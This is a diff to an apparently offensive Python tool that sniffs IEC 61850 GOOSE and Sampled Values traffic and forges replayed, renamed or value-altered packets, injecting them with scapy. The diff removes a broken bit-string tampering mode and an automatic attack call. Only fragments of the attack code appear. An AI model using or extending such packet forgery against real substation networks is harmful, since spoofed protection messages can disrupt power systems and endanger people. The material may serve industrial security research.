@@ -254,53 +254,6 @@ def toggle_value_by_id(gd, change_value_id):
                 item.setComponentByName('boolean', not boolean_value)
             index += 1
 
-def change_bit_string_value(gd):
-    index = 1
-    for item in gd['allData']:
-        if hasattr(item, 'getComponentByName'):
-            bit_string_value = item.getComponentByName('bit-string')
-            if bit_string_value is not None:
-                try:
-                    print(f"{index} : {item}")
-                    index += 1
-                except:
-                    ...
-
-    while True:
-        change_value_id = int(input("Which message do you want to change (-1 to submit): "))
-        if change_value_id == -1:
-            break
-        new_value = int(input("New value: "))
-        change_bit_string_by_id(gd, change_value_id, new_value)
-
-    print("New packet: ")
-    for item in gd['allData']:
-        if hasattr(item, 'getComponentByName'):
-            bit_string_value = item.getComponentByName('bit-string')
-            if bit_string_value is not None:
-                try:
-                    print(item)
-                except:
-                    ...
-
-def change_bit_string_by_id(gd, change_value_id, new_value):
-    index = 1
-    for item in gd['allData']:
-        if hasattr(item, 'getComponentByName'):
-            bit_string_value = item.getComponentByName('bit-string')
-            bit_string_value = '11001010'  # Example binary string
-            bit_string = univ.BitString(bit_string_value).subtype(
-                implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 4)
-            )
-            if bit_string_value is not None and index == change_value_id:
-                try:
-                    item.setComponentByName('bit-string', bit_string)
-                except Exception as e:
-                    print(f"Error while modifying bit-string: {e}")
-            index += 1
-
-    # Reassign `allData` to ensure consistency in the schema structure
-    gd.setComponentByName('allData', gd['allData'])
 
 def encode_and_update_packet(p, gd):
     # Encode modified GOOSE PDU and update APDU header
@@ -411,8 +364,6 @@ def attack(p, gd, type, replay, rename, change_boolean_value, change_bit_string)
 
     elif change_boolean_value:
         toggle_boolean_value(gd)
-    elif change_bit_string:
-        change_bit_string_value(gd)         # Still has issues
     if not skip: modified_packet = encode_and_update_packet(p, gd)
     if modified_packet:
         sendp(modified_packet, iface="en1", verbose=False)
@@ -473,9 +424,6 @@ def packet_handler(p):
 
         datSetList.append(str(gd['datSet']))
 
-        if ATTACK_SIM == 1:
-            attack(p, gd)
-
     if sv_test(p):
         src_mac, dst_mac = p['Ether'].src, p['Ether'].dst
         asdu = sv_pdu_decode(bytes.fromhex("60" + SV(p.load)[SVPDU].original.hex()))['savPdu']['asdu'][0]
@@ -509,11 +457,10 @@ def select_mode():
     print("Replay: 1")
     print("Rename: 2")
     print("Change boolean values: 3")
-    print("Change bit.string values: 4 (NOT WORKING)")
-    return prompt_for_int("Choose a mode: ", valid_options=[1, 2, 3, 4])
+    return prompt_for_int("Choose a mode: ", valid_options=[1, 2, 3])
 
 def perform_attack(mode, protocol, p, data):
-    options = [mode == 1, mode == 2, mode == 3, mode == 4]
+    options = [mode == 1, mode == 2, mode == 3]
     attack(p, data, protocol, *options)
 
 def handle_attack():
